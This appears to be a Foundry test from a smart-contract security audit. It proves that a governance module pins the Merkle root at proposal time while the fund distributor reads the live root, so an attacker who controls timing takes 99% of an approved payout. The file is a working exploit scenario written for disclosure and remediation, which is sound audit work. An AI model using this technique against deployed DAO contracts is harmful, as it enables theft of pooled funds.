// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;

import {Test} from "forge-std/Test.sol";
import {RoundPins} from "test/helpers/RoundPins.sol";
import {Operation} from "@gnosis-guild/zodiac-core/core/Operation.sol";

import {MerkleGovModule} from "src/zodiac/MerkleGovModule.sol";
import {MerkleFundDistributor} from "src/merkle/MerkleFundDistributor.sol";
import {IMerkleFundDistributor} from "interfaces/IMerkleFundDistributor.sol";
import {IMerkleSnapshot} from "interfaces/merkle/IMerkleSnapshot.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract PTR_MockSnapshot is IMerkleSnapshot {
    MerkleState private _state;
    bool public hasState;

    function setMerkleState(MerkleState memory s) external {
        _state = s;
        hasState = true;
    }

    function getLatestState() external view override returns (MerkleState memory) {
        if (!hasState) revert NoMerkleStates();
        return _state;
    }

    /// @dev Replays what `MerkleSnapshot._updateStateAtBlock` does to every installed hook when a
    ///      permissionless `submitProof` lands: it pushes the new state into the consumer.
    function pushToHook(address hook) external {
        MerkleGovModule(hook).onMerkleUpdate(_state);
    }
}

contract PTR_Token is ERC20 {
    constructor() ERC20("T", "T") {}

    function mint(address to, uint256 a) external {
        _mint(to, a);
    }
}

/// @title PashovTrust_RootPinningAsymmetry
/// @notice SEAM: two consumers of the SAME proven root use OPPOSITE pinning disciplines.
///         `MerkleGovModule._propose` snapshots `merkleRoot` + `totalVotingPower` + `quorumFraction`
///         at proposal time (the M-1 remediation), so a root landing mid-vote cannot re-decide a
///         vote. `MerkleFundDistributor._distribute` does the opposite: it reads
///         `getLatestState()` at CALL time. Since `MerkleGovModule.execute` is permissionless and
///         `MerkleSnapshot.submitProof` is permissionless, the same actor can choose the block in
///         which a governance-approved payout is executed AND the block in which the next root
///         lands - so the money is split by a scoreboard the DAO never voted under.
contract PashovTrust_RootPinningAsymmetry is Test {
    PTR_MockSnapshot internal snapshot;
    PTR_Token internal token;
    MerkleGovModule internal gov;
    MerkleFundDistributor internal dist;

    address internal member = address(0x0111);
    address internal other = address(0x0777);
    address internal attacker = address(0xBADBAD);
    address internal funder = address(0xF00D);

    bytes32 internal rootV1;
    bytes32 internal leafMemberV1;
    bytes32 internal leafOtherV1;

    bytes32 internal rootV2;
    bytes32 internal leafAttackerV2;
    bytes32 internal leafOtherV2;

    function _leaf(address a, uint256 v) internal pure returns (bytes32) {
        return keccak256(bytes.concat(keccak256(abi.encode(a, v))));
    }

    function _pair(bytes32 a, bytes32 b) internal pure returns (bytes32) {
        return a <= b ? keccak256(abi.encode(a, b)) : keccak256(abi.encode(b, a));
    }

    function setUp() public {
        snapshot = new PTR_MockSnapshot();
        token = new PTR_Token();

        // Epoch N scoreboard: the DAO's real members.
        leafMemberV1 = _leaf(member, 900);
        leafOtherV1 = _leaf(other, 100);
        rootV1 = _pair(leafMemberV1, leafOtherV1);

        // Epoch N+1 scoreboard: the attacker has since farmed vouches and now dominates.
        leafAttackerV2 = _leaf(attacker, 9_900);
        leafOtherV2 = _leaf(other, 100);
        rootV2 = _pair(leafAttackerV2, leafOtherV2);

        snapshot.setMerkleState(
            IMerkleSnapshot.MerkleState({
                blockNumber: block.number,
                timestamp: block.timestamp,
                root: rootV1,
                ipfsHash: bytes32(uint256(1)),
                ipfsHashCid: "Qm1",
                totalValue: 1_000
            })
        );

        // owner = avatar = target = this test (stands in for the DAO Safe); snapshot bound.
        gov = new MerkleGovModule(address(this), address(this), address(this), address(snapshot));

        // The DAO's fund, on the factory's terms.
        dist = new MerkleFundDistributor(address(this), address(snapshot), address(this), 0, false);

        token.mint(funder, 1_000 ether);
        vm.prank(funder);
        token.approve(address(dist), type(uint256).max);
    }

    function test_GovernancePinsTheRootButTheDistributorDoesNot() public {
        // --- 1. A member proposes "fund the distributor for this epoch". ---------------------
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        bytes[] memory calldatas = new bytes[](1);
        Operation[] memory ops = new Operation[](1);
        string[] memory descs = new string[](1);
        targets[0] = address(dist);
        values[0] = 0;
        // The proposal the wizard builds: `expectedRoot = 0` (the optional guard, skipped).
        calldatas[0] = abi.encodeWithSignature(
            "distribute(address,uint256,bytes32)", address(token), uint256(100 ether), bytes32(0)
        );
        ops[0] = Operation.Call;
        descs[0] = "payout";

        bytes32[] memory proofMember = new bytes32[](1);
        proofMember[0] = leafOtherV1;

        vm.prank(member);
        uint256 pid = gov.propose("payout", "epoch N", targets, values, calldatas, ops, descs, 900, proofMember);

        (MerkleGovModule.Proposal memory p,,) = gov.getProposal(pid);
        assertEq(p.merkleRoot, rootV1, "governance PINNED the epoch-N root at proposal time");
        assertEq(p.totalVotingPower, 1_000, "governance PINNED the epoch-N total");

        // --- 2. A new epoch's root lands mid-flight. `submitProof` is permissionless, so any -----
        //        prover (including the attacker) chooses this block.
        snapshot.setMerkleState(
            IMerkleSnapshot.MerkleState({
                blockNumber: block.number,
                timestamp: block.timestamp,
                root: rootV2,
                ipfsHash: bytes32(uint256(2)),
                ipfsHashCid: "Qm2",
                totalValue: 10_000
            })
        );
        snapshot.pushToHook(address(gov));

        // Governance is untouched: the proposal still resolves against the root it was created on.
        (MerkleGovModule.Proposal memory p2,,) = gov.getProposal(pid);
        assertEq(p2.merkleRoot, rootV1, "the vote is still decided by the epoch-N scoreboard");
        assertEq(gov.currentMerkleRoot(), rootV2, "but the module's LIVE root has already moved");

        // --- 3. The approved payout executes. `_distribute` reads `getLatestState()` NOW. -------
        //        (Executed here as a direct call: `MerkleGovModule.execute` would forward exactly
        //        this calldata through the Safe, and it is permissionless, so the attacker picks
        //        the block.)
        RoundPins.Pins memory _pins0 = RoundPins.read(dist, 100 ether);
        vm.prank(funder);
        uint256 idx = dist.distribute(address(token), 100 ether, _pins0.root, _pins0.totalValue, 0, type(uint256).max, _pins0.feeRecipient);

        IMerkleFundDistributor.DistributionState memory d = dist.getDistribution(idx);
        assertEq(d.root, rootV2, "the DAO's approved payout bound the epoch-N+1 scoreboard");
        assertEq(d.totalMerkleValue, 10_000);

        // --- 4. The consequence: the attacker takes 99% of a payout approved under a --------
        //        scoreboard on which they did not appear at all.
        bytes32[] memory proofAttacker = new bytes32[](1);
        proofAttacker[0] = leafOtherV2;
        uint256 before = token.balanceOf(attacker);
        dist.claim(idx, attacker, 9_900, proofAttacker);
        assertEq(token.balanceOf(attacker) - before, 99 ether, "99% to an account the DAO never voted on");

        // The member who held 90% of the voting power the DAO decided under gets nothing.
        vm.expectRevert(IMerkleFundDistributor.InvalidMerkleProof.selector);
        dist.claim(idx, member, 900, proofMember);
    }
}
